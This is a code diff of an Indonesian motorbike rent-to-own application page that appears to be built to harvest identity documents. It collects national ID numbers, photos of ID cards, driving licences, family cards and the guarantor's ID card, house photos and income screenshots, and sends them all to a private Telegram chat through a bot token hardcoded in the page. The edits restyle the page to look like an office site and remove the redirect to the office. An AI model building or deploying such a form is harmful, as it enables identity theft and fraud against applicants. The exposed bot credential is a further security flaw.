@@ -4,223 +4,213 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Formulir Polytron Fox 350</title>
-
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
-
 <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
-/* STYLE CLEAN POLYTRON (MERAH) */
-:root { --primary: #d90429; --bg: #f8fafc; --card: #ffffff; --text: #0f172a; --border: #e2e8f0; }
+/* STYLE CLEAN MIRIP KANTOR */
+:root { --primary: #3b82f6; --bg: #f1f5f9; --card: #ffffff; --text: #334155; --border: #cbd5e1; }
 body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); margin: 0; padding: 20px; color: var(--text); }
-.container { max-width: 550px; margin: 0 auto; background: var(--card); padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); border-top: 6px solid var(--primary); }
-.header { text-align: center; margin-bottom: 30px; }
-.header h2 { margin: 0; font-size: 26px; font-weight: 800; color: #1e293b; letter-spacing: -0.5px; }
-.badge { background: #d90429; color: white; padding: 5px 15px; border-radius: 20px; font-size: 12px; font-weight: 700; display: inline-block; margin-top: 10px; }
-.section-label { font-size: 11px; font-weight: 800; text-transform: uppercase; color: var(--primary); letter-spacing: 1px; margin: 30px 0 15px; border-bottom: 2px solid #f1f5f9; padding-bottom: 5px; }
+.container { max-width: 500px; margin: 0 auto; background: var(--card); padding: 25px; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
+.header { text-align: center; margin-bottom: 25px; border-bottom: 2px solid #f8fafc; padding-bottom: 15px; }
+.header h2 { margin: 0; font-size: 22px; color: #0f172a; }
+.header p { margin: 5px 0 0; font-size: 13px; color: #64748b; }
+
+.section-title { font-size: 14px; font-weight: 700; margin: 25px 0 15px; color: #0f172a; border-left: 4px solid var(--primary); padding-left: 10px; }
 .form-group { margin-bottom: 15px; }
-label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 8px; color: #334155; }
-input, select { width: 100%; padding: 14px; border: 1px solid var(--border); border-radius: 10px; font-size: 14px; box-sizing: border-box; font-family: inherit; transition: 0.2s; background: #f8fafc; }
-input:focus { outline: none; border-color: var(--primary); background: #fff; }
-.upload-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
-.upload-box { border: 1px dashed #cbd5e1; background: #fff; border-radius: 10px; padding: 20px 10px; text-align: center; position: relative; transition: 0.2s; }
-.upload-box:hover { border-color: var(--primary); background: #fff5f5; }
+label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; color: #475569; }
+.wajib-asli { color: #dc2626; font-size: 11px; font-weight: 800; font-style: italic; margin-left: 5px; }
+
+input, select, textarea { width: 100%; padding: 12px; border: 1px solid var(--border); border-radius: 8px; font-size: 14px; box-sizing: border-box; background: #fff; }
+input:focus { outline: none; border-color: var(--primary); ring: 2px solid #bfdbfe; }
+
+/* UPLOAD BOX STYLE */
+.upload-box { border: 2px dashed #cbd5e1; border-radius: 8px; padding: 20px; text-align: center; position: relative; background: #f8fafc; transition: 0.2s; cursor: pointer; }
+.upload-box:hover { border-color: var(--primary); background: #eff6ff; }
 .upload-box input { position: absolute; top: 0; left: 0; width: 100%; height: 100%; opacity: 0; cursor: pointer; }
-.icon { font-size: 24px; display: block; margin-bottom: 8px; }
-.lbl-up { font-size: 11px; font-weight: 700; display: block; color: #334155; }
-.note-up { font-size: 9px; color: #ef4444; font-weight: 800; display: block; margin-top: 4px; }
-.preview { width: 100%; height: 90px; object-fit: cover; border-radius: 8px; display: none; margin-top: 10px; border: 1px solid #e2e8f0; }
-.multi-box { background: #fff5f5; padding: 20px; border-radius: 12px; border: 1px dashed #fb7185; }
-.btn { width: 100%; padding: 18px; background: var(--primary); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 800; cursor: pointer; margin-top: 30px; transition: 0.2s; box-shadow: 0 4px 15px rgba(217, 4, 41, 0.3); }
-.btn:hover { background: #b90323; transform: translateY(-2px); }
-.btn:disabled { background: #cbd5e1; cursor: not-allowed; }
-#loading { display: none; text-align: center; margin-top: 20px; font-size: 13px; color: #d90429; font-weight: 700; }
-.back-link { display: block; text-align: center; margin-top: 20px; color: #64748b; text-decoration: none; font-size: 12px; }
+.icon-up { font-size: 24px; color: var(--primary); display: block; margin-bottom: 5px; }
+.text-up { font-size: 12px; font-weight: 600; color: #3b82f6; }
+.preview { width: 100%; height: 120px; object-fit: cover; border-radius: 6px; display: none; margin-top: 10px; border: 1px solid #e2e8f0; }
+
+.checkbox-group { display: flex; flex-direction: column; gap: 10px; }
+.checkbox-item { display: flex; align-items: center; gap: 10px; font-size: 14px; }
+.checkbox-item input { width: 18px; height: 18px; margin: 0; }
+
+.btn { width: 100%; padding: 16px; background: #2563eb; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 30px; }
+.btn:hover { background: #1d4ed8; }
+.btn:disabled { background: #94a3b8; cursor: not-allowed; }
+#loading { display: none; text-align: center; margin-top: 15px; font-size: 13px; color: #2563eb; font-weight: 600; }
 </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h2>SEWA MILIK</h2>
-        <div class="badge">POLYTRON FOX 350</div>
+        <h2>POLYTRON FOX 350</h2>
+        <p>Formulir Pengajuan Sewa Milik</p>
     </div>
 
     <form id="formPolytron">
-        <div class="section-label">DATA PRIBADI</div>
-        <div class="form-group"><label>Nama Lengkap (Sesuai KTP)</label><input type="text" id="nama" required placeholder="Nama Lengkap"></div>
-        <div class="form-group"><label>Nomor WhatsApp</label><input type="tel" id="wa" required placeholder="08xxxxxxxxxx"></div>
-        <div class="form-group"><label>Alamat Email</label><input type="email" id="email" required placeholder="email@contoh.com"></div>
-
-        <div class="section-label">DATA PENJAMIN (WAJIB SATU KK)</div>
-        <div class="form-group"><label>Nama Penjamin</label><input type="text" id="penjaminNama" required></div>
-        <div class="form-group"><label>Nomor WhatsApp Penjamin</label><input type="tel" id="penjaminNo" required></div>
-        <div class="form-group"><label>Hubungan</label>
-            <select id="penjaminHubungan" required>
-                <option value="">-- Pilih Hubungan --</option>
-                <option>Orang Tua</option>
-                <option>Suami / Istri</option>
-                <option>Saudara Kandung</option>
-                <option>Anak</option>
+        <div class="form-group"><label>Nomor NIK KTP</label><input type="number" id="nik" required placeholder="16 digit NIK"></div>
+        <div class="form-group"><label>Nama Depan Pemohon</label><input type="text" id="namaDepan" required></div>
+        <div class="form-group"><label>Nama Belakang Pemohon</label><input type="text" id="namaBelakang" required></div>
+        <div class="form-group"><label>Nomor Telepon Pemohon</label><input type="tel" id="telp" required placeholder="08..."></div>
+        <div class="form-group"><label>Nomor WhatsApp Pemohon</label><input type="tel" id="wa" required placeholder="08..."></div>
+        <div class="form-group"><label>Alamat Email Pemohon</label><input type="email" id="email" required></div>
+        <div class="form-group"><label>Alamat Domisili</label><textarea id="alamat" rows="2" required></textarea></div>
+        
+        <div class="form-group"><label>Pilih Kota / Cabang</label>
+            <select id="kota" required>
+                <option value="">-- Pilih Kota --</option>
+                <option>Jakarta</option><option>Bogor</option><option>Depok</option>
+                <option>Tangerang</option><option>Bekasi</option>
             </select>
         </div>
+        
+        <div class="form-group"><label>Unit yang akan Disewa</label>
+            <input type="text" value="Polytron Fox 350" readonly style="background:#f1f5f9; color:#64748b; font-weight:bold">
+        </div>
 
-        <div class="section-label">DOKUMEN PERSYARATAN</div>
-        <div class="upload-grid">
-            <div class="upload-box">
-                <span class="icon">🪪</span><span class="lbl-up">KTP ASLI</span>
-                <input type="file" id="ktp" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_ktp">
-            </div>
-            <div class="upload-box">
-                <span class="icon">📄</span><span class="lbl-up">KARTU KELUARGA</span>
-                <input type="file" id="kk" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_kk">
-            </div>
-            <div class="upload-box">
-                <span class="icon">💳</span><span class="lbl-up">SIM C</span>
-                <input type="file" id="sim" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_sim">
-            </div>
-            <div class="upload-box" style="border-color:#d90429; background:#fff1f2">
-                <span class="icon">👥</span><span class="lbl-up" style="color:#d90429">KTP PENJAMIN</span><span class="note-up">(WAJIB 1 KK)</span>
-                <input type="file" id="foto_penjamin" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_foto_penjamin">
-            </div>
-            <div class="upload-box">
-                <span class="icon">⚡</span><span class="lbl-up">DOMISILI / LISTRIK</span>
-                <input type="file" id="domisili" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_domisili">
-            </div>
-            <div class="upload-box">
-                <span class="icon">📱</span><span class="lbl-up">PROFIL OJOL</span>
-                <input type="file" id="profil" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_profil">
+        <div class="section-title">DATA PENJAMIN</div>
+        <div class="form-group"><label>Nama Penjamin</label><input type="text" id="penjaminNama" required></div>
+        <div class="form-group"><label>Hubungan dengan Penjamin</label>
+            <select id="penjaminHubungan" required>
+                <option value="">-- Pilih Hubungan --</option>
+                <option>Orang Tua</option><option>Suami/Istri</option><option>Saudara Kandung</option><option>Anak</option>
+            </select>
+        </div>
+        <div class="form-group"><label>Nomor Telepon Penjamin</label><input type="tel" id="penjaminTelp" required></div>
+
+        <div class="section-title">DOKUMEN PENDUKUNG</div>
+        
+        <div class="form-group"><label>Foto KTP Pemohon <span class="wajib-asli">(HARUS ASLI)</span></label>
+            <div class="upload-box"><span class="icon-up">📷</span><span class="text-up">Tap untuk Upload KTP</span>
+            <input type="file" id="ktp" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_ktp"></div>
+        </div>
+
+        <div class="form-group"><label>Foto SIM Pemohon <span class="wajib-asli">(HARUS ASLI)</span></label>
+            <div class="upload-box"><span class="icon-up">💳</span><span class="text-up">Tap untuk Upload SIM</span>
+            <input type="file" id="sim" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_sim"></div>
+        </div>
+
+        <div class="form-group"><label>Foto KK Pemohon <span class="wajib-asli">(HARUS ASLI)</span></label>
+            <div class="upload-box"><span class="icon-up">📄</span><span class="text-up">Tap untuk Upload KK</span>
+            <input type="file" id="kk" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_kk"></div>
+        </div>
+
+        <div class="form-group"><label>Bukti Rumah / Token Listrik <span class="wajib-asli">(HARUS ASLI)</span></label>
+            <div class="upload-box"><span class="icon-up">⚡</span><span class="text-up">Tap untuk Upload Bukti</span>
+            <input type="file" id="rumah" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_rumah"></div>
+        </div>
+
+        <div class="form-group"><label>Foto KTP Penjamin <span class="wajib-asli">(HARUS ASLI)</span></label>
+            <div class="upload-box"><span class="icon-up">👥</span><span class="text-up">Tap untuk Upload KTP Penjamin</span>
+            <input type="file" id="ktp_penjamin" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_ktp_penjamin"></div>
+        </div>
+
+        <div class="section-title">ADDITIONAL FORM</div>
+
+        <div class="form-group"><label>Foto Tampak Depan Rumah</label>
+            <div class="upload-box"><span class="icon-up">🏠</span><span class="text-up">Tap untuk Upload Foto Rumah</span>
+            <input type="file" id="foto_rumah_depan" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_foto_rumah_depan"></div>
+        </div>
+
+        <div class="form-group"><label>Aplikasi Ride-Hailing yang Digunakan</label>
+            <div class="checkbox-group" id="ojolCheck">
+                <label class="checkbox-item"><input type="checkbox" value="Gojek/Gocar"> Gojek | Gocar</label>
+                <label class="checkbox-item"><input type="checkbox" value="Gojek/Goride"> Gojek | Goride</label>
+                <label class="checkbox-item"><input type="checkbox" value="Grab/Car"> Grab | Grab Car</label>
+                <label class="checkbox-item"><input type="checkbox" value="Grab/Ride"> Grab | Grab Ride</label>
+                <label class="checkbox-item"><input type="checkbox" value="Maxim/Indriver"> Others (Maxim/Indriver)</label>
             </div>
         </div>
 
-        <div class="section-label">BUKTI PENDAPATAN</div>
-        <div class="multi-box">
-            <label style="color:#9f1239">Screenshot Pendapatan</label>
-            <input type="file" id="gajiInput" multiple accept="image/*" style="width:100%; background:white">
-            <div style="display:flex; gap:8px; flex-wrap:wrap; margin-top:15px" id="gajiBox"></div>
+        <div class="form-group"><label>Upload Bukti Penghasilan (Screenshot)</label>
+            <div class="upload-box"><span class="icon-up">📱</span><span class="text-up">Tap untuk Upload Screenshot</span>
+            <input type="file" id="bukti_ojol" accept="image/*" required onchange="prev(this)"><img class="preview" id="show_bukti_ojol"></div>
         </div>
 
-        <div id="loading">⏳ Sedang Menyusun PDF...<br>Mohon tunggu, jangan tutup halaman.</div>
-        <button type="submit" class="btn" id="btnKirim">AJUKAN SEKARANG</button>
+        <div class="form-group"><label>Surat Domisili (Jika Alamat Beda KTP)</label>
+            <div class="upload-box"><span class="icon-up">📄</span><span class="text-up">Tap untuk Upload Domisili</span>
+            <input type="file" id="surat_domisili" accept="image/*" onchange="prev(this)"><img class="preview" id="show_surat_domisili"></div>
+        </div>
+
+        <div id="loading">⏳ Sedang memproses data...</div>
+        <button type="submit" class="btn" id="btnKirim">SUBMIT</button>
     </form>
-    <a href="index.html" class="back-link">← Kembali ke Menu</a>
 </div>
 
 <script>
-// CONFIG TELEGRAM
+// --- CONFIG ADMIN ---
 const BOT_TOKEN = "8235411301:AAE9bUwgg4eYS1M_e5_F30SAmNPgPs5zlF0";
-// Ganti ID ini dengan ID GRUP jika mau masuk ke grup
 const CHAT_ID = "1902240448"; 
-const UNIT_NAME = "POLYTRON FOX 350";
+const UNIT_NAME = "POLYTRON FOX 350"; 
 
 function prev(input) {
     if(input.files && input.files[0]) {
-        let id = input.id;
-        let imgId = id === 'foto_penjamin' ? 'show_foto_penjamin' : 'show_' + id;
-        document.getElementById(imgId).src = URL.createObjectURL(input.files[0]);
-        document.getElementById(imgId).style.display = "block";
+        let imgId = 'show_' + input.id;
+        if(document.getElementById(imgId)) {
+            document.getElementById(imgId).src = URL.createObjectURL(input.files[0]);
+            document.getElementById(imgId).style.display = "block";
+        }
     }
 }
 
-let gajiFiles = [];
-document.getElementById('gajiInput').addEventListener('change', function(e) {
-    const box = document.getElementById('gajiBox'); box.innerHTML = ""; 
-    gajiFiles = Array.from(e.target.files).slice(0,10);
-    gajiFiles.forEach(f => {
-        const img = document.createElement('img'); img.src = URL.createObjectURL(f); img.className = "thumb"; box.appendChild(img);
-    });
-});
-
-const toBase64 = file => new Promise((resolve) => {
-    const reader = new FileReader();
-    reader.readAsDataURL(file);
-    reader.onload = () => resolve(reader.result);
-});
-
-// SUBMIT -> PDF -> TELEGRAM
-document.getElementById('formPolytron').addEventListener('submit', async (e) => {
+document.querySelector('form').addEventListener('submit', async (e) => {
     e.preventDefault();
-    if(gajiFiles.length === 0) { alert("Wajib upload bukti pendapatan."); return; }
-
     const btn = document.getElementById('btnKirim');
     const load = document.getElementById('loading');
-    const namaUser = document.getElementById('nama').value;
+    const namaUser = document.getElementById('namaDepan').value;
     
+    const fileIDs = ['ktp', 'sim', 'kk', 'rumah', 'ktp_penjamin', 'foto_rumah_depan', 'bukti_ojol', 'surat_domisili'];
+
     btn.disabled = true; load.style.display = "block";
 
     try {
+        // 1. KIRIM PDF RANGKUMAN
+        load.innerText = "📄 Mengirim PDF Rangkuman...";
         const { jsPDF } = window.jspdf;
         const doc = new jsPDF();
+        
+        doc.setFontSize(16); doc.text(`DATA: ${UNIT_NAME}`, 20, 20);
+        doc.setFontSize(12); doc.text(`Nama: ${namaUser}`, 20, 30);
+        doc.text(`NIK: ${document.getElementById('nik').value}`, 20, 40);
+        doc.text(`WA: ${document.getElementById('wa').value}`, 20, 50);
+        doc.text(`*Foto Asli dikirim terpisah di bawah`, 20, 70);
+        
+        const pdfBlob = doc.output('blob');
+        let formPDF = new FormData();
+        formPDF.append('chat_id', CHAT_ID);
+        formPDF.append('document', pdfBlob, `SUMMARY_${namaUser}.pdf`);
+        formPDF.append('caption', `🔥 ORDER BARU: ${namaUser}\nUnit: ${UNIT_NAME}\n\n👇 FOTO ASLI (MENTAHAN) DI BAWAH INI 👇`);
 
-        // 1. HALAMAN BIODATA
-        load.innerText = "Membuat Halaman Biodata...";
-        doc.setFontSize(18); doc.text(`PENGAJUAN: ${UNIT_NAME}`, 20, 20);
-        doc.setFontSize(12);
-        // Referral Dihapus
-        doc.text(`Nama: ${namaUser}`, 20, 35);
-        doc.text(`WhatsApp: ${document.getElementById('wa').value}`, 20, 45);
-        doc.text(`Email: ${document.getElementById('email').value}`, 20, 55);
-        
-        doc.text(`---------------------------------------`, 20, 70);
-        doc.text(`DATA PENJAMIN (SATU KK):`, 20, 80);
-        doc.text(`Nama: ${document.getElementById('penjaminNama').value}`, 20, 90);
-        doc.text(`No WA: ${document.getElementById('penjaminNo').value}`, 20, 100);
-        doc.text(`Hubungan: ${document.getElementById('penjaminHubungan').value}`, 20, 110);
-        
-        // FUNGSI PDF GAMBAR
-        async function addImageToPdf(file, title) {
-            if(file) {
-                doc.addPage();
-                doc.setFontSize(14); doc.text(title, 20, 20);
-                const imgData = await toBase64(file);
-                const imgProps = doc.getImageProperties(imgData);
-                const pdfWidth = doc.internal.pageSize.getWidth() - 40;
-                const pdfHeight = (imgProps.height * pdfWidth) / imgProps.width;
-                doc.addImage(imgData, 'JPEG', 20, 30, pdfWidth, pdfHeight);
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formPDF });
+
+        // 2. KIRIM FOTO MENTAHAN
+        for (let id of fileIDs) {
+            let input = document.getElementById(id);
+            if (input && input.files && input.files[0]) {
+                load.innerText = `📤 Mengupload Foto: ${id.toUpperCase()}...`;
+                let formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('document', input.files[0]); 
+                formData.append('caption', `${id.toUpperCase()} - ${namaUser}`); 
+
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
             }
         }
 
-        // 2. FOTO DOKUMEN
-        load.innerText = "Menyematkan Dokumen...";
-        await addImageToPdf(document.getElementById('ktp').files[0], "KTP ASLI");
-        await addImageToPdf(document.getElementById('kk').files[0], "KARTU KELUARGA");
-        await addImageToPdf(document.getElementById('sim').files[0], "SIM C");
-        await addImageToPdf(document.getElementById('foto_penjamin').files[0], "KTP PENJAMIN"); // Foto Penjamin
-        await addImageToPdf(document.getElementById('domisili').files[0], "DOMISILI / LISTRIK");
-        await addImageToPdf(document.getElementById('profil').files[0], "PROFIL OJOL");
-
-        // 3. BUKTI PENDAPATAN
-        load.innerText = "Menyematkan Bukti Gaji...";
-        let count = 1;
-        for (let file of gajiFiles) {
-            await addImageToPdf(file, `BUKTI PENDAPATAN #${count}`);
-            count++;
-        }
-
-        const pdfBlob = doc.output('blob');
-
-        // 4. KIRIM PDF KE TELEGRAM
-        load.innerText = "Mengirim PDF ke Admin...";
-        let formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('document', pdfBlob, `POLYTRON_${namaUser.replace(/\s+/g, '_')}.pdf`);
-        formData.append('caption', `📄 Pengajuan Polytron: ${namaUser}\n(Data Penjamin ada di dalam PDF)`);
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-
-        alert("✅ SUKSES! File PDF terkirim.");
-        window.location.href = "index.html";
+        // 3. SELESAI (TANPA REDIRECT KANTOR)
+        load.innerText = "✅ Selesai!";
+        alert("Terima kasih! Data Anda berhasil dikirim.\n\nTim Admin kami akan segera memproses pengajuan Anda ke Pusat.\nMohon tunggu konfirmasi via WhatsApp.");
+        window.location.href = "index.html"; // Balik ke Menu Utama
 
     } catch(err) {
         console.error(err);
+        alert("Gagal kirim. Cek koneksi internet Anda.");
         btn.disabled = false;
-        load.innerText = "Gagal. Coba lagi.";
-        alert("Gagal memproses PDF. Cek memori/koneksi.");
+        load.style.display = "none";
     }
 });
 </script>
-
 </body>
 </html>
